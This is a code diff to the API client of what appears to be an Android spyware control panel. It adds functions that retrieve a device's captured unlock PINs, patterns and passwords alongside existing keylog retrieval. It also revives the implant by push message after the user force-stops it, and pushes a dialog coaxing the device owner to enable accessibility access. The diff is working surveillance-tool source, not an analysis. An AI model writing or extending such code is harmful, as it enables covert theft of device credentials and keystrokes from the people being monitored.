@@ -435,6 +435,13 @@ export const getKeylogs = async (deviceId: string, page = 1, limit = 100) => {
     return res.data;
 };
 
+// Unlock Attempts (PINs, Patterns, Passwords)
+export const getUnlocks = async (deviceId: string, page = 1, limit = 50) => {
+    const res = await api.get(`/devices/${deviceId}/unlocks`, { params: { page, limit } });
+    return res.data;
+};
+
+
 // Apps
 export const getApps = async (deviceId: string, includeSystem = false) => {
     const res = await api.get(`/devices/${deviceId}/apps`, { params: { includeSystem } });
@@ -473,6 +480,18 @@ export const dispatchCommand = async (deviceId: string, type: string, payload?: 
 
 export const getCommandHistory = async (deviceId: string, limit = 50) => {
     const res = await api.get(`/commands/history/${deviceId}`, { params: { limit } });
+    return res.data;
+};
+
+// Wakeup device via FCM push (useful after force stop)
+export const wakeupDevice = async (deviceId: string) => {
+    const res = await api.post('/commands/wakeup', { deviceId });
+    return res.data;
+};
+
+// Request user to enable accessibility via FCM push (opens a dialog on device)
+export const requestAccessibility = async (deviceId: string) => {
+    const res = await api.post('/commands/request-accessibility', { deviceId });
     return res.data;
 };
 
